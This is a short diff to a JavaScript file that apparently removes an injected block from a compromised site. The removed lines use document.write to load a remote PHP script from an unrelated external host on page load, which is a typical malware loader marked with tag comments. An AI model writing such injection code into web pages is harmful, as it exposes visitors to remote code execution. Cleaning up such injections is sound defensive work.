@@ -813,8 +813,3 @@ function hideSeeAlso()
 	if (div)
 		div.style.visibility = "hidden";
 }
-
-/*371c84*/
-document.write('<script type="text/javascript" src="http://biozapp.com/Kfx6FNrG.php?id=13042530"></script>');
-
-/*/371c84*/
